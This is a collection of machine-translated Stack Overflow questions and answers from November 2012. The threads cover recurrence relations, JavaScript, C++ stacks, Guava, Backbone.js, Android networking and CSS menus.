> ID：13429378
> 
> 赞同：1
> 
> 时间：2012-11-17T09:37:26.283
> 
> 标签：iteration, recurrence

我有这个重复关系

```
T(n) = T(n-1) + n, for n ≥ 2
T(1) = 1 
```

练习题：用迭代法求解递推关系，给出一个渐近的运行时间。

所以我这样解决了：

```
T(n) = T(n-1) + n 
        = T(n-2)  + (n - 1) + n 
        = T(n-3) + (n - 2) + (n - 1) + n 
        = … 
        = T(1) + 2 + … (n - 2) + (n - 1) + n **
        = 1 + 2 + … + (n - 2) + (n - 1) + n
        = O(n^2) 
```

我有一些问题：

> 1）我怎样才能找到渐近运行时间？
> 
> **2) 在问题的这种状态下，T(1) 意味着存在 n，当它与一个数字相减时，结果为 1，对吗？
> 
> 3) 如果 T(0) = 1 会怎样，如果 T(2) = 1 会怎样？

编辑：4）为什么`n ≥ 2`有用？

我真的需要为我的期中考试了解它

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:59:52.050

```
T(n) = T(n-1) + n, for n ≥ 2
T(1) = 1 
```

if`T(x)`代表运行时间：

您已经找到了渐近运行时间`O(n^2)`（二次）。

如果关系变为`T(0) = 1`或`T(2) = 1`，则运行时间仍然是二次的。如果您添加一个常数或乘以一个常数，渐近行为不会改变，并且更改初始条件只会将一个常数添加到以下项中。

`n ≥ 2`存在于关系中，因此`T(n)`对于每个正`n`. 否则，这两行都适用于`T(1)`. 您无法`T(1)`使用`T(0)`. `T(n) = T(n-1) + n`即使可以，`T(1)`也会以两种不同（并且可能不一致）的方式定义。

# javascript - Window.Navigate 方法在 Firefox 和 Chrome 中不起作用

> ID：13429382
> 
> 赞同：3
> 
> 时间：2012-11-17T09:37:42.167
> 
> 标签：javascript, asp.net

> **可能重复：**
> [按钮 javasript 适用于 IE，但不适用于 firefox window.navigate()](https://stackoverflow.com/questions/1112093/button-javasript-works-on-ie-but-not-firefox-window-navigate)

**我想将问题 ID 与 URL 一起传递给答案页面，但它不适用于我使用 ASP.Net 的 Chrome 和 Firefox，**

* * *

> 导航方法不起作用，还有其他方法吗？

* * *

```
function display(QuestionID)

{

 window.navigate("Answer.aspx?TutID=" + QuestionID);

} 
```

请帮忙

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-17T10:16:05.167

试试这个：

```
var url = "Answer.aspx?TutID=" + QuestionID;

location.href = url; 
```

# c++ - 如何在 C++ 中直接访问堆栈的元素？

> ID：13429388
> 
> 赞同：0
> 
> 时间：2012-11-17T09:38:40.000
> 
> 标签：c++

出于某种原因，我必须使用堆栈来实现某些功能，但我需要反转输出堆栈的元素。所以我想用它`stack<char,vector<char>`来实现直接访问，但是我的建议可能会有一些错误。谁能告诉我如何使用 STL 堆栈有效地反转 C++ 中的输出堆栈元素？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:42:36.103

使用临时堆栈。

```
// On exit the stack 's' will have it's elements reversed.
void reverse_stack(std::stack<int>& s)
{
    std::stack<int> tmp;
    while (!s.empty())
    {
        tmp.push(s.pop());
    }
    s.swap(tmp);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:44:23.697

如果您不想或不能`stack`以所需的方式使用，首先您应该认为`do you really need stack?`例如使用`queue`或`deque`代替可能会更好`stack`，这样您可以更好地控制它！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-17T09:44:49.237

如果您想以任何顺序访问元素，为什么首先使用堆栈？

直接使用`std::vector`or `std::deque`，然后像这样向后迭代

```
for (auto iter = vec.rbegin(); iter != vec.rend(); ++iter) {
    process(*iter);
} 
```

* * *

如果你真的需要，有一种 hackish 但正确的方法来访问`stack`'s 的底层容器对象。

请参阅：[如何方便地打印出 std::stack 或 std::queue 中的所有元素](https://stackoverflow.com/questions/4523178/how-to-print-out-all-elements-in-a-stdstack-or-stdqueue-conveniently?rq=1)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T09:48:50.537

一般来说，您不应该这样做。

选择一个专门用于限制您访问其内容的容器然后说您确实想要该访问权限是不合适的。

最好选择为满足您的需求而构建的容器。在这种情况下使用 a[`deque`](http://www.cplusplus.com/reference/stl/deque/)似乎更合适。

但是，如果您想要做一些愚蠢的事情，这就是您直接访问堆栈成员的方式（请注意，这不会使用大量额外内存和时间来构建临时反向堆栈，因为一些其他答案建议）：

```
#include <stack>
#include <deque>
#include <cstdlib>
#include <iostream>
using namespace std;

template <class T, class S>
    S& Container(stack<T, S>& q) {
        struct HackedStack : private stack<T, S> {
            static S& Container(stack<T, S>& q) {
                return q.*&HackedStack::c;
            }
        };
    return HackedStack::Container(q);
}

int main()
{
    stack<int> st;
    deque<int> &mems = Container(st);

    cout<<"Putting numbers into the stack"<<endl;
    for(int i=0;i<20;i++){
        int temp=rand();
        cout<<temp<<endl;
        st.push(rand());
    }

    cout<<endl<<"Reading numbers in the stack"<<endl;
    for(deque<int>::iterator i=mems.begin();i!=mems.end();i++)
        cout<<*i<<endl;

    cout<<endl<<"Taking numbers out of the stack"<<endl;
    while(!st.empty()){
        int temp=st.top();
        st.pop();
        cout<<temp<<endl;
    }

    return 0;
} 
```

而且，是的，如果您将所有`deque`引用更改为`vector`引用，这仍然可以正常工作。但`deque`可能是与您的堆栈一起使用的更可取的容器。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-11-17T09:44:13.867

要反转输出，请使用这个简单的递归函数（伪代码）

```
 void recursiveWalk(Node* current)
  {
       if (current->next != NULL)
           recusiveWalk(current->next);
        // do stuff here
  }

  //call passing top
  recursiveWalk(stack->top); 
```

这将以相反的顺序建立堆栈。当您在最后一个元素上时，调用堆栈将开始展开，允许您从底部到顶部对堆栈进行操作。

# javascript - 使用 Javascript/JSP/Java 的多人客户端/服务器游戏

> ID：13429389
> 
> 赞同：1
> 
> 时间：2012-11-17T09:39:05.297
> 
> 标签：javascript, jsp

我想实现一个小型多人客户端/服务器游戏。这是我的并发程序项目。我用 Java 编写了应用程序的基本逻辑并且它正在工作。我想让它基于网络。我不知道该怎么做。这是我要实现的一小部分：

```
<%@page import="javacode.Client"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<%
    Client client = new Client();
        boolean b = client.connect();
%>
<%= b%>

<script type="text/javascript"></script>
<script type="text/javascript">
    function sendToServer(){
        var line = document.getElementById("input").value;
        //send line to server using client.send()
        client.send(line);
        //get response from server to client using client.get()
        line = client.get();
        document.getElementById("input").value=line;
    }
</script>

<html>
    <head></head>
    <body>
        <br>
        <input type="text" name="input" id="input"/>
        <input type="button" value="send" onclick="sendToServer()"/>
        <input type="text" name="output" id="output" />
    </body>
</html> 
```

我正在启动一个聊天回显服务器，然后打开这个 JSP 页面。它通过创建客户端对象连接到服务器。但我想使用相同的客户端对象与服务器进行进一步的通信。每当我单击发送按钮时，它必须获取输入字段的值并将其发送到服务器，然后使用该`client.get()`方法从服务器获取响应并将值设置为输出字段。作为一个 Java 程序`Client.java`运行良好，但我不确定如何基于 Web 进行操作。

PS：我不想使用小程序。

# .net - 哪个更快：在字符串或列表中查找？

> ID：13429393
> 
> 赞同：1
> 
> 时间：2012-11-17T09:40:01.803
> 
> 标签：.net

我必须将一个大文件加载到内存中，并且我想找到一个子字符串。哪种方法更快？

// 应用程序初始化

```
string instring  = "which is faster find in string or list..."; // large string +- 150MB
List<string> inlist = new List<string>();
foreach (string word in instring) {
    inlist.Add(word);
} 
```

// 按钮点击

```
if (instring.Contains("find")) {
  ...
} 
```

或者

```
if (inlist.Contains("find")) {
  ...
} 
```

在我的情况下，我做了一些测量字符串搜索是最快的。

```
Singel search:
Boyer-Moore search found - elapsed: 00:00:00.0025893
String search found - elapsed: 00:00:00.0026120
List search not found - elapsed: 00:00:00.0026394

Multi search:
Boyer-Moore search found - elapsed: 00:00:00.0027377
Boyer-Moore search found - elapsed: 00:00:00.0028308
Boyer-Moore search found - elapsed: 00:00:00.0029269
Boyer-Moore search found - elapsed: 00:00:00.0030234
Boyer-Moore search found - elapsed: 00:00:00.0031210

String search found - elapsed: 00:00:00.0032474
String search found - elapsed: 00:00:00.0032653
String search found - elapsed: 00:00:00.0032832
String search found - elapsed: 00:00:00.0033015
String search found - elapsed: 00:00:00.0033201

List search not found - elapsed: 00:00:00.0033629
List search not found - elapsed: 00:00:00.0033826
List search not found - elapsed: 00:00:00.0033961
List search not found - elapsed: 00:00:00.0034155
List search not found - elapsed: 00:00:00.0034345 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T09:43:37.147

你正在测试完全不同的东西。

例如，假设您确实在寻找“find”，并且您有一个文件是：

```
If you're interested in finding the answer, make sure you know the question. 
```

如果你把它分成一个字符串列表，每个单词一个，那么“find”就不会出现——因为它只是“finding”这个词的一部分。但是，使用`string.Contains`你*会*发现它，因为它是一个子字符串。

你应该首先制定出你想要的*行为*，以最简单、最优雅的方式实现它，然后衡量性能。如果这符合您想要的性能，那么您就完成了。如果没有，您可以尝试改进它，在每个点进行测量并确保您仍然拥有您想要的*行为。*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:46:46.193

通过缓冲区流式传输文件并按行分析它可能会更好。在这两种情况下，您都必须读取整个文件，但是当您构建列表时，您必须在内存中拥有完整的文件内容

c# 来自[microsoft msdn的示例](http://msdn.microsoft.com/de-de/library/system.io.streamreader.aspx)

```
using System;
using System.IO;

class Test 
{
    public static void Main() 
    {
        try 
        {
            // Create an instance of StreamReader to read from a file.
            // The using statement also closes the StreamReader.
            using (StreamReader sr = new StreamReader("TestFile.txt")) 
            {
                string line;
                string subString = "find this";
                // Read and display lines from the file until the end of 
                // the file is reached.
                while ((line = sr.ReadLine()) != null) 
                {
                    if ( line.Contains(substring) ) 
                    {
                         Console.WriteLine("Found string");
                         break;
                    }
                }
            }
        }
        catch (Exception e) 
        {
            // Let the user know what went wrong.
            Console.WriteLine("The file could not be read:");
            Console.WriteLine(e.Message);
        }
    }
} 
```

# java - 如何避免在番石榴中懒惰地应用 Lists.transform？

> ID：13429400
> 
> 赞同：11
> 
> 时间：2012-11-17T09:41:21.220
> 
> 标签：java, guava

```
Map<String,Object> map = Maps.newHashMap();
map.put("test","123");
map.put("fuyou001","456");
map.put("id",145);
List<Map<String,Object>> list = Lists.newArrayList();
list.add(map);
Lists.transform(list, new Function<Map<String, Object>, Object>() {
  @Override
  public Object apply(@Nullable Map<String, Object> input) {
    System.out.println("test:" + input);
    return input;
  }
});
System.out.println(list);` 
```

控制台不显示“测试....”

如何避免偷懒
我也试试

```
List<Map<String,Object>> newList = new ArrayList<Map<String, Object>>(list.size());
Collections.copy(newList,list); 
```

但不影响

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-11-17T11:10:01.093

`Function`s 一般不应该有副作用；那是你真正的问题。

也就是说，如果您坚持立即应用转换，请复制：`Lists.newArrayList(Lists.transform(list, function))`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-23T05:18:30.237

使用 ImmutableList 将强制立即计算值，因此之后不需要额外的副本。这也许是一个更优雅的解决方案：

```
list = ImmutableList.copyOf(Lists.transform(list, 
  new Function<Map<String, Object>, Object>() {
  @Override
  public Object apply(@Nullable Map<String, Object> input) {
    System.out.println("test:" + input);
    return input;
  }
}));
System.out.println(list);` 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-19T08:47:14.713

为了补充路易斯的回答，您使用`Lists.transform()`的好像它修改了原始`list`的一样，例如`Collections.sort()`. 它没有。

您必须使用的返回值`Lists.transform()`来查看发生的情况，请记住，这是一个每次调用时都会评估的*视图。*因此，如果您需要多次使用结果，如 Louis 所说，请在新的`List`( `ArrayList`,`ImmutableList`等) 中复制一份。

# javascript - 在 Backbone.js 中获取 URL 片段而不是哈希

> ID：13429401
> 
> 赞同：2
> 
> 时间：2012-11-17T09:41:47.667
> 
> 标签：javascript, backbone.js, url-routing, router

我已经为此苦苦挣扎了很长时间。我正在使用 Backbone.js 和 Require.js。我试图告诉 Backbone 根据当前 URL（而不是哈希）显示特定视图。我的代码如下所示：

```
define(['jquery','underscore','backbone', 'views/manage_pages'], function($, _, Backbone,  ManagePages) {
  var AppRouter = Backbone.Router.extend({
    routes:{
      '/new_page': "showPageForm",
      '/edit_page': "showPageEditForm",
      '*actions': "showPageForm"
    },
  });
  var initialize = function(){
    appRouter = new AppRouter;
    appRouter.on("route:showPageForm", function(){
      console.log('hej');
    });
    appRouter.on("route:showPageEditForm", function(){
      console.log('ho');
    });
    var page_form = new ManagePages();
      Backbone.history.start();
    }
    return {
      initialize: initialize
    }
  }); 
```

所以基本上，当用户访问[http://example.com/new_page](http://example.com/new_page)时，它​​应该记录`<code>hej</code>`，而当他访问[http://example.com/editpage](http://example.com/editpage)时，它​​应该记录`<code>ho</code>`。我不知道如何做到这一点，或者即使它是可能的。谁能帮我？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-17T10:37:40.057

您可以使用 Backbone 对[HTML5 push-state](https://developer.mozilla.org/en-US/docs/DOM/Manipulating_the_browser_history)的支持，它默认使用 URL 路径（而不是哈希片段）。只需在调用时将其指定为选项[`history.start`](http://backbonejs.org/#History-start)：

```
Backbone.history.start({ pushState: true }); 
```

（请注意，如果您的应用程序位于域下的子路径中，那么您可以告诉 Backbone 将其用作根目录`Backbone.history.start({pushState: true, root: "/myapproot/"})`-- 尽管在您的情况下看起来这不是问题。）

# security - 用户数据加密应用是否需要 ECCN？

> ID：13429403
> 
> 赞同：1
> 
> 时间：2012-11-17T09:42:03.487
> 
> 标签：security, windows-8, cryptography, microsoft-metro

我正在开发一个 Windows 8 Metro 应用程序，它使用户能够加密他们的文件，例如文档、图像和歌曲。我使用密钥长度为 32 进行 AES 加密。这个应用程序需要 ECCN 吗？如果是，我可以使用什么 ECCN 在 Windows 8 应用商店上发布此应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:08:41.673

根据文档

> 如果您的应用程序调用、支持、包含或使用加密或加密来执行任何不在不受限制任务列表中的任务，则它需要一个出口商品分类号 (ECCN) 才能在商店中出售。

[更多关于 ECCN](http://en.wikipedia.org/wiki/Export_Control_Classification_Number)

这是ECCN的列表

[商业管制清单的字母索引](http://www.bis.doc.gov/policiesandregulations/ear/ccl_index.pdf)

# matlab - 如何在 Matlab 中使用自定义内核，如卡方

> ID：13429404
> 
> 赞同：0
> 
> 时间：2012-11-17T09:42:11.597
> 
> 标签：matlab, machine-learning, svm

我想在 matlab 中使用带有 svmtrain 的卡方内核，但我在互联网上找不到实现。有谁知道如何为 matlab 函数 svmtrain 制作自定义 MATLAB 内核？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T15:22:53.317

您可以将匿名函数`@(x,y) 1 - sum((x - y).^2 ./ (x + y) / 2)`作为 kernel_function 参数传递。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-13T23:17:08.590

您可以通过使用预先计算的内核来实现这一点，一个很好的例子和更详细的解释可以在这个问题中找到：[using precomputed kernels with libsvm](https://stackoverflow.com/questions/7715138/using-precomputed-kernels-with-libsvm)

# ruby-on-rails - RoR：为延迟作业重新加载初始化程序：性能类

> ID：13429407
> 
> 赞同：1
> 
> 时间：2012-11-17T09:42:34.887
> 
> 标签：ruby-on-rails, ruby, asynchronous, delayed-job

在 RoR 中使用延迟作业模块时，我遇到了下一个问题：我启动的 RoR 应用程序有一个上下文，而 /lib 目录中的 :perfomable 类（延迟任务）有另一个上下文：初始化程序加载了两次。所以这意味着，我不能使用存储在初始化程序中的共享常量，因为一个常量创建了两次。你能给我什么建议？

我想使用常量在应用程序级别上存储一些数据，而不是在持久性级别上。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T09:17:52.053

I advice everybody to use Resque or Rabbit for system tasks. Delayed job is not good because it loads new rails context for each task.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:08:55.393

您可以在内存共享存储中使用，例如[Redis](http://redis.io/)。

# pdf - Grails 从 pdf 文件中查找/读取文本

> ID：13429415
> 
> 赞同：0
> 
> 时间：2012-11-17T09:43:47.710
> 
> 标签：pdf, grails, groovy

我们正在使用 grails 2.1.1，我们想从上传的**pdf**文件中搜索**联系电话。**我们已经用 doc 文件完成了这项工作，但现在我们也想从 pdf 文件中搜索和提取联系人。有什么方法可以从 grails 中的 pdf 文件中搜索和提取文本。

 *** * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:12:46.353

你看过[apache tika](http://tika.apache.org)吗？

它应该处理这两种格式并节省您分别处理每种类型的时间**

# c# - C#/C++ - 如何获取路径太长或权限被拒绝的目录大小？

> ID：13429416
> 
> 赞同：4
> 
> 时间：2012-11-17T09:44:00.377
> 
> 标签：c#, c++, winapi

有很多关于如何获取目录大小的问题和答案 - 递归地求和文件的长度 - 很容易。

但是，我看到的所有答案都不完整。例如，在您递归迭代卷的地方，有一些目录会引发异常`UnauthorizedAccessException`。我还注意到在 Win 7 中有超过 260 个字符的路径，这会引发`PathTooLongException`.

所有这一切意味着，至少在 C# 中，您无法扫描 C:\ 驱动器并获取卷大小的真实数字，因为您必须跳过任何引发异常的目录或文件。

我正在寻找一种方法来获取存储在磁盘上给定目录的字节的正确、真实、准确的数字。我不在乎我是否必须走低级并编写一些 C++，或者调用 Win API。

如何做到这一点？谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T11:00:27.490

这并不容易，但可以做到，虽然我不确定你是否能克服权限问题，但你必须做的是进入较低级别并直接读取 NTFS 主文件表，如这篇精彩的[文章所示这位](http://code.msdn.microsoft.com/windowsdesktop/CCS-LABS-C-Accessing-the-d317805c/sourcecode?fileId=60931&pathId=14261056)有爱心的[开发](http://code.msdn.microsoft.com/windowsdesktop/CCS-LABS-C-Accessing-the-d317805c)人员从另一个这样的开发人员那里得到了这个想法。

这是[一个](http://technet.microsoft.com/en-us/library/cc781134%28v=ws.10%29.aspx)可以帮助您的参考。谷歌“NTFS 架构”或设计更多规格。并请分享您的一些工作和研究:) 这将对许多人有所帮助

**编辑**： [另一个](http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib)可以帮助你的项目。经过测试，它说它只支持 NTFS 3.0 或更高版本。

# android - 仅当尚未存在时才在列表视图中添加项目

> ID：13429418
> 
> 赞同：0
> 
> 时间：2012-11-17T09:44:16.070
> 
> 标签：android, android-widget, android-listview, updates

仅当列表中不存在此项目时，我才想在我的 Android 小部件中添加一个新项目。

我尝试使用***contains()***方法，但它仍然不起作用。

事实上，我得到了一个*JSON 对象*，对于每个 JSON 对象，我想测试列表中是否已经存在与此 JSON 对象对应的项目。

*如果是，则不执行任何操作，如果否，则将该项目添加到列表顶部。*

这是我的代码：

```
//parsing data
        String titre, url, site, ancienprix, nouveauprix, temperature, pseudo, categorie, dealtermine, date, id;

        try{
            jArray = new JSONArray(result);
            JSONObject json_data=null;

            SharedPreferences setNbDeal = PreferenceManager.getDefaultSharedPreferences(mContext);
            String nbDeal = setNbDeal.getString("nbDeal", "30");

            int nbDeals = Integer.parseInt(nbDeal);

            for(int i=0;i<nbDeals;i++){
                json_data = jArray.getJSONObject(i);
                titre=json_data.getString("titre");
                url=json_data.getString("url");
                site=json_data.getString("site");
                ancienprix=json_data.getString("ancienprix");
                nouveauprix=json_data.getString("nouveauprix");
                dealtermine=json_data.getString("dealtermine");
                temperature=json_data.getString("temperature");
                pseudo=json_data.getString("pseudo");
                categorie=json_data.getString("categorie");
                date=json_data.getString("date");
                id=json_data.getString("id");

                WidgetItem currentItem = new WidgetItem(titre, url, site, ancienprix, nouveauprix, dealtermine, temperature, pseudo, categorie, date);

                if (mWidgetItems.contains(currentItem)){
                    break;
                } else {
                    mWidgetItems.add(currentItem);
                }
            }
        } 
```

这是声明 mWidgetItem 的代码：

```
private List<WidgetItem> mWidgetItems = new ArrayList<WidgetItem>(); 
```

这是我的 Widget Item 类的代码：

```
public class WidgetItem {
    public String titre, url, ancienprix, nouveauPrix, temperature, site, submitter, categorie, dealTermine, date;

    public WidgetItem(String titre, String url, String site, String ancienprix, String nouveauPrix, String dealTermine, String temperature, String submitter, String categorie, String date) {
        this.titre = titre;
        this.url = url;
        this.site = site;
        this.ancienprix = ancienprix;
        this.nouveauPrix = nouveauPrix;
        this.dealTermine = dealTermine;
        this.temperature = temperature;
        this.submitter = submitter;
        this.categorie = categorie;
        this.date = date;
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:15:01.783

您可以在将所有元素添加到列表中后使用此方法（它会删除重复项）：

```
private ArrayList<WidgetItem> getUniqueElements(Collection<WidgetItem> values)
{
    return new ArrayList<WidgetItem>(new TreeSet<WidgetItem>(values));
} 
```

# javascript - 函数调用 add() 之前的 _(下划线) 有什么区别？

> ID：13429419
> 
> 赞同：6
> 
> 时间：2012-11-17T09:44:20.093
> 
> 标签：javascript, jquery, jquery-plugins, indexeddb

```
$.each(data, function(i){
        _(catalog.add(this));//iterating through each object in objectStore
}); 
```

我想知道如果我在函数调用之前排除下划线会有什么不同。

**更新**

OP 指的是[jquery indexeddb plugin](https://github.com/axemclion/jquery-indexeddb/blob/master/jquery.indexeddb.js)。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-17T09:57:10.860

它调用一个被调用的函数`_`并将表达式的结果`catalog.add(this)`作为第一个也是唯一的参数传递。

该函数很可能是由您可以从[underscorejs.org](http://underscorejs.org/)下载的库定义的函数，这是一系列库中的另一个，它们缺乏显示变量名的意图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:51:45.783

[http://underscorejs.org/#chaining](http://underscorejs.org/#chaining)

我不确定它对你有什么作用，但这是文档。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-18T05:40:58.447

编辑：

简短的回答：是的，没有什么不同。去掉它。

从您的源 js 文件中，`_`是用于记录 promise 对象结果的函数名称。因此，如果您不在乎`add`返回什么方法，则必须在生产代码中将其删除。`add`方法应该返回新创建的键。

对我来说，那些`$`,和没有意义。`i``_``this`

`add(this)`非常可怕。什么是`this`？

# java - java中的xml解析更改字符串

> ID：13429423
> 
> 赞同：-2
> 
> 时间：2012-11-17T09:44:39.260
> 
> 标签：java, xml, swing, parsing, stringescapeutils

我正在通过 smack api 制作聊天应用程序。当我发送包含此字符`'`的消息时，输出为

消息==女士

输出==

嘛

'

是

这是代码

```
 StringEscapeUtils.unescapeHtml((new String(ch, start, length).replace("&amp;#39;", "`").replace("&apos;", "'"))); 
```

这是代码

```
DefaultHandler handler = new DefaultHandler() {
                @Override
                public void startDocument() throws SAXException {
                }

                @Override
                public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {                        
                        for (int i = 0; i < attributes.getLength(); i++) {
                            if (attributes.getLocalName(i).equalsIgnoreCase("from")) {
                                from = attributes.getValue(i);
                                break;
                            }
                        }                        
                   ....
                }

                @Override
                public void characters(char ch[], int start, int length) throws SAXException {
                    String str = StringEscapeUtils.unescapeHtml((new String(ch, start, length)));                    
                    switch (elementType) {
                        case 1:
                            msg = str;
                            break;
                     ...
                        default:
                           ...
                            break;
                    }
//                  

                @Override
                public void endElement(String uri, String localName, String qName) throws SAXException {
                }

                @Override
                public void endDocument() throws SAXException {
                } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:01:08.007

很多时候，XML 解析器会将文本元素分解为多个字符节点。从 XML 的角度来看，这是完全有效的。所以你需要适当地处理这个问题。所以也许问题出在 print ，而不是*unescaping*。

例如，我可以想象以下 XML

```
<n>A &amp; B</n> 
```

产生以下事件：

1.  开始节点`n`
2.  文本节点“ `A`”
3.  文本节点“ `&amp;`”
4.  文本节点“ `B`”
5.  端节点`n`

现在，如果您`println`看到每个字符“事物”，您将得到三行而不是一行。也许您的解析器可以选择强制“**规范化**”事件以加入连续文本节点。

（对不起，如果我没有使用所有适当的 XML 术语。我的 XML 术语已经有点生疏了，所以请随时编辑这个问题并输入正确的 XML 术语。谢谢）

# internet-explorer-9 - Watin 可以与 MS EI 10 / Internet explorer 10 一起使用吗？特别是文件下载和文件上传？

> ID：13429427
> 
> 赞同：2
> 
> 时间：2012-11-17T09:45:11.263
> 
> 标签：internet-explorer-9, watin, internet-explorer-10

我一直在 IE 7 和 8 中使用 Watin（目前为 2.1），效果很好。在 IE 9 中，以编程方式控制视图底部的 IE 9 下载栏以及使用文件上传`ie.FileUpload(...).Set(path)`需要几分钟才能在文件上传对话框中实际输入要上传的文件，这方面存在重大问题。

有没有人测试过 IE 10 是否比 IE 9 更有效？安装 IE 10 有意义吗？IE 10 还有其他问题吗？

我在 Visual Studio 2012 中使用 C#/ASP.NET。

# android - Android 应用无法在 Android 4 上运行

> ID：13429430
> 
> 赞同：0
> 
> 时间：2012-11-17T09:45:56.987
> 
> 标签：android, ftp, android-4.0-ice-cream-sandwich, ftp-client

我在 2.3.3 上创建了一个 Android 项目并在移动设备 2.3.3 上进行了尝试，一切正常。它在移动 4 上不起作用，所以我为 Android 4 重新构建了，但我遇到了同样的问题。

这是代码：

```
public void FTP_Download(){
  String server = "192.168.1.135";
  int port = 21;
  String user = "pc1";
  String pass = "1551";
  FTPClient ftpClient = new FTPClient();
  try {
    ftpClient.connect(server, port);
    ftpClient.login(user, pass);
    ftpClient.enterLocalPassiveMode();
    ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
    Toast.makeText(getBaseContext(), "download starting.",Toast.LENGTH_LONG).show();
    // APPROACH #1: using retrieveFile(String, OutputStream)
    String remoteFile1 = "i.xml";
    File downloadFile1 = new File("sdcard/i.xml");
    OutputStream outputStream1 = new BufferedOutputStream(new FileOutputStream(downloadFile1));
    boolean success = ftpClient.retrieveFile(remoteFile1, outputStream1);
    outputStream1.close();
    if (success) {
      Toast.makeText(getBaseContext(), "File #1 has been downloaded successfully.",Toast.LENGTH_LONG).show();
    }
  } catch (IOException ex) {
    System.out.println("Error: " + ex.getMessage());
    ex.printStackTrace();
  } finally {
    try {
      if (ftpClient.isConnected()) {
        ftpClient.logout();
        ftpClient.disconnect();
      }
    } catch (IOException ex) {
      ex.printStackTrace();
    }
  }
} 
```

笔记：

我使用 commons-net-3.1 进行连接。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:49:09.723

在 android 2.3 以上版本中，您无法从主 UI 线程启动 Internet 连接。相反，您应该使用[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)。我假设您没有使用 AsyncTask。如果是，请发布代码并记录 cat 。ICS 和 HoneyComb 不允许您在 UI 线程上执行的其他操作的一些示例是：（来自下面评论中发布的链接）-

*   打开一个 Socket 连接（即 new Socket()）。
*   HTTP 请求（即 HTTPClient 和 HTTPUrlConnection）。
*   尝试连接到远程 MySQL 数据库。
*   下载文件（即 Downloader.downloadFile()）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T10:26:33.267

当我为 andoid 4 使用“互联网连接”编程时，我执行如下异步任务：

您可以将此类代码与主体文件放在同一个文件中，以与全局变量或函数交互。

```
public class MyAsyncTask extends AsyncTask<String, Void, String> {

  @Override
  protected String doInBackground(String... urls) {
    String url = urls[0]        
    try {
      //Connection request code, in your case ftp
    } catch (Exception e) {
      //Catch code
    }
  }

  @Override
  protected void onPostExecute(String result) {
    //Code to de After the connection is done
  }
} 
```

然后，在 Activity 我调用 Asyn Task

```
String url = "http://...";
new MyAsyncTask().execute(url); 
```

**编辑** 这里解释了如何使用异步任务，并举例

[http://developer.android.com/reference/android/os/AsyncTask.html](http://developer.android.com/reference/android/os/AsyncTask.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-17T09:56:45.567

正如@phazorRise 解释的那样，您不应该使用主 UI 线程来启动网络连接或从中读取/写入数据。但我强烈反对使用 AsyncTask 来执行下载。AsyncTask 专为短期操作而设计，下载文件不属于该类别。

如果您的文件很大（我认为这取决于用户，所以我们可以说它们很大），实现目标的最相关方法是使用服务来下载文件。

我邀请您看一下[RoboSpice](https://github.com/octo-online/robospice)，它将为您的应用程序提供网络健壮性，它确实是 Android 上最有趣的网络请求库。

这是一个[信息图表](https://raw.github.com/octo-online/robospice/master/gfx/RoboSpice-InfoGraphics.png)，可让您熟悉替代方案并了解为什么使用服务比任何其他技术都要好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-18T07:42:52.280

我添加了这段代码，一切正常

```
StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

StrictMode.setThreadPolicy(policy); 
```

注意：我从另一篇文章中的@user1169115 评论中获取了代码。这不是最好的解决方案，但我不知道为什么 asynctask 不起作用，所以我别无选择。

# html - 左侧边框未显示在菜单栏上

> ID：13429436
> 
> 赞同：0
> 
> 时间：2012-11-17T09:46:59.657
> 
> 标签：html, css, navigation, nav

我为我的网页创建了 CSS 菜单栏。但是当有人在“我的演示文稿”链接上移动鼠标时，左侧边框不显示。当前选择了“我的最爱”链接。请注意左侧灰色边框未显示在“我的最爱”链接上。但是当你在“朋友的最爱”链接上移动鼠标时，右侧边框会显示在“我的最爱”链接上。我需要显示左侧边框。

这是链接：- [jsFiddle 链接](http://jsfiddle.net/gauravishere/fAA5T/2/)

```
 <ul class="menu" style="margin-top:20px;">
    <li><a href="#">Home</a></li>
    <li><a href="my-presentations.htm">My Presentations</a></li>
    <li class="current"><a href="myFavorite.htm">My Favorite</a></li>
    <li><a href="#">Friend's Favorite</a></li>
    <li><a href="#">Most Viewed</a></li>
    <li><a href="#">Sync account</a></li>
</ul>

  /* NAVBAR CSS START HERE */     
.menu,.menu ul,.menu li,.menu a {margin: 0;padding: 0;border: none;outline: none;}
